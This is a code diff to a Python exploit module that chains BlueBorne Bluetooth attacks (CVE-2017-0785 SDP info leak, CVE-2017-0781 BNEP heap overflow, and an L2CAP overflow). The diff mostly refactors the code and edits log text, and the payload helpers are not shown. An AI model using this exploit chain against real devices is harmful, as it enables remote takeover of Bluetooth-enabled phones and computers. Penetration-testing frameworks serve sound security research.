@@ -382,7 +382,10 @@ class Exploit(Exploit):
             return
 
         print_status(f"BlueBorne attack: {self.attack} against {self.target_address}")
+        self._exploit()
 
+    def _exploit(self) -> None:
+        """E2E BlueBorne exploit chain: SDP info leak + BNEP heap overflow + L2CAP overflow."""
         if self.attack in ("info_leak", "full_chain"):
             print_status("=== Phase 1: SDP Information Leak (CVE-2017-0785) ===")
             leaked = self._sdp_info_leak()
@@ -400,7 +403,7 @@ class Exploit(Exploit):
                 else:
                     print_info("Could not identify ASLR bases from leaked data.")
             else:
-                print_error("SDP info leak failed — no data returned.")
+                print_error("SDP info leak failed: no data returned.")
 
         if self.attack in ("bnep_overflow", "full_chain"):
             print_status("=== Phase 2: BNEP Heap Overflow (CVE-2017-0781) ===")
@@ -408,7 +411,7 @@ class Exploit(Exploit):
             if result:
                 print_success("BNEP overflow triggered successfully.")
             else:
-                print_info("BNEP overflow completed — verify target status manually.")
+                print_info("BNEP overflow completed: verify target status manually.")
 
         if self.attack == "l2cap_overflow":
             if not HAS_SCAPY_BT:
